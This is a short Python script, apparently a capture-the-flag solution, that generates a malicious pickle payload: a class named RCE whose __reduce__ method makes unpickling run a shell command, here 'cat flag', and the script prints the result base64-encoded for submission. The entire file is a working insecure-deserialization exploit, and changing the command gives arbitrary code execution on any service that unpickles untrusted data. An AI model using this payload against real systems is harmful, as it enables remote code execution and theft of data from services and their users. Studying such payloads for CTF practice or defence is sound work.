import pickle
import base64
import subprocess


class RCE:
    def __reduce__(self):
        cmd = ["cat", "flag"]
        return subprocess.check_output, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode())
